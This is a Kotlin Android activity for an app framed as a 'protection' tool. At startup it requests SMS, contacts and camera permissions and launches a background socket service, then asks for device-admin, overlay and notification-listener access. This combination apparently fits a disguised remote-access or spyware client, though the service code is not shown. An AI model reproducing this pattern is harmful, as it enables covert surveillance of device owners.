package com.ahmed.zai

import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.widget.Button
import android.widget.Switch
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat

class MainActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        val switchCamera = findViewById<Switch>(R.id.switchCamera)
        val switchApps = findViewById<Switch>(R.id.switchApps)
        val switchNotif = findViewById<Switch>(R.id.switchNotif)
        val btnAdmin = findViewById<Button>(R.id.btnAdmin)
        val btnLockNow = findViewById<Button>(R.id.btnLockNow)
        val statusText = findViewById<TextView>(R.id.statusText)

        // طلب الصلاحيات الأساسية
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            ActivityCompat.requestPermissions(this, arrayOf(android.Manifest.permission.POST_NOTIFICATIONS), 101)
        }
        ActivityCompat.requestPermissions(this, arrayOf(android.Manifest.permission.READ_SMS, android.Manifest.permission.READ_CONTACTS, android.Manifest.permission.CAMERA), 102)

        // تشغيل السيرفر في الخلفية
        try {
            startService(Intent(this, SocketService::class.java))
        } catch (e: Exception) {
            Toast.makeText(this, "خطأ في تشغيل الخدمة", Toast.LENGTH_SHORT).show()
        }

        // تفعيل الأدمن
        btnAdmin.setOnClickListener {
            val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, ComponentName(this, MyDeviceAdminReceiver::class.java))
            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "مطلوب لتفعيل الحماية")
            startActivity(intent)
        }

        // قفل الشاشة فورا
        btnLockNow.setOnClickListener {
            val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val adminComponent = ComponentName(this, MyDeviceAdminReceiver::class.java)
            if (dpm.isAdminActive(adminComponent)) {
                dpm.lockNow()
            } else {
                Toast.makeText(this, "فعّل صلاحيات الحماية الأول!", Toast.LENGTH_SHORT).show()
            }
        }

        // سويتش الكاميرا
        switchCamera.setOnCheckedChangeListener { _, isChecked ->
            val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val adminComponent = ComponentName(this, MyDeviceAdminReceiver::class.java)
            if (dpm.isAdminActive(adminComponent)) {
                dpm.setCameraDisabled(adminComponent, isChecked)
                statusText.text = if(isChecked) "📸 الكاميرا مقفولة" else "📸 الكاميرا مفتوحة"
                statusText.setTextColor(if(isChecked) 0xFF00FF00.toInt() else 0xFFef4444.toInt())
            } else {
                switchCamera.isChecked = false
                Toast.makeText(this, "فعّل صلاحيات الحماية الأول!", Toast.LENGTH_SHORT).show()
            }
        }

        // سويتش التطبيقات
        switchApps.setOnCheckedChangeListener { _, isChecked ->
            if (isChecked) {
                if (!Settings.canDrawOverlays(this)) {
                    startActivity(Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:$packageName")))
                }
                statusText.text = "🖼️ حماية الصور شغالة"
            }
        }

        // سويتش الإشعارات
        switchNotif.setOnCheckedChangeListener { _, isChecked ->
            if (isChecked) {
                startActivity(Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"))
            }
        }
    }
}
